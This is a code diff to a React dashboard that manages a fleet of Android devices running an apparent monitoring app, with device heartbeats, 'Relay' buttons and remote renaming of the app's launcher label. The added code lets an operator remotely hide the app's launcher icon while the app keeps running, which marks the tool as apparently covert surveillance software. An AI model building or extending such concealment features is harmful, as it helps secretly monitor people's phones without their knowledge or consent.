@@ -7,7 +7,7 @@ type Device = {
   deviceId:string; model:string; androidVersion:string; appVersion:string;
   installed:string[]; missing:string[]; monitorRunning:boolean;
   batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
-  alias?:string; appLabel?:string;
+  alias?:string; appLabel?:string; hidden?:boolean;
 };
 
 const ALIAS_OPTIONS = [
@@ -21,6 +21,13 @@ async function renameDevice(id:string, alias:string, label:string){
   const j=await r.json();
   if(r.ok) alert(`Rename queued for ${id.slice(0,8)} — launcher name becomes "${label}" within 5s`);
   else alert(`Rename failed: ${j.error||r.status}`);
+}
+
+async function toggleVisibility(id:string, visible:boolean){
+  const r=await fetch(`/api/devices/${encodeURIComponent(id)}/visibility`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({visible})});
+  const j=await r.json();
+  if(r.ok) alert(visible?`Visible queued for ${id.slice(0,8)} — launcher icon returns within 5s`:`Hide queued for ${id.slice(0,8)} — launcher icon disappears within 5s (app stays installed + running)`);
+  else alert(`Visibility failed: ${j.error||r.status}`);
 }
 
 export default function Dashboard(){
@@ -65,7 +72,9 @@ export default function Dashboard(){
             ))}</div></td>
             <td className="p-3"><div className="flex gap-1.5"><button onClick={()=>setDlg({id:d.deviceId,slot:1})}
                 className="bg-violet-600 text-white text-xs px-3 py-1.5 rounded-lg hover:bg-violet-700">Relay 1</button><button onClick={()=>setDlg({id:d.deviceId,slot:2})}
-                className="bg-fuchsia-600 text-white text-xs px-3 py-1.5 rounded-lg hover:bg-fuchsia-700">Relay 2</button></div></td>
+                className="bg-fuchsia-600 text-white text-xs px-3 py-1.5 rounded-lg hover:bg-fuchsia-700">Relay 2</button><button onClick={()=>toggleVisibility(d.deviceId,!d.hidden)}
+                title={d.hidden?"Bring the launcher icon back":"Hide the launcher icon"}
+                className={`text-xs px-3 py-1.5 rounded-lg border ${d.hidden?"bg-emerald-600 text-white border-emerald-600 hover:bg-emerald-700":"hover:bg-gray-100"}`}>{d.hidden?"Visible":"Hide"}</button></div>{d.hidden && <div className="text-[11px] text-amber-600 mt-1">icon hidden</div>}</td>
           </tr>
         })}</tbody>
       </table>
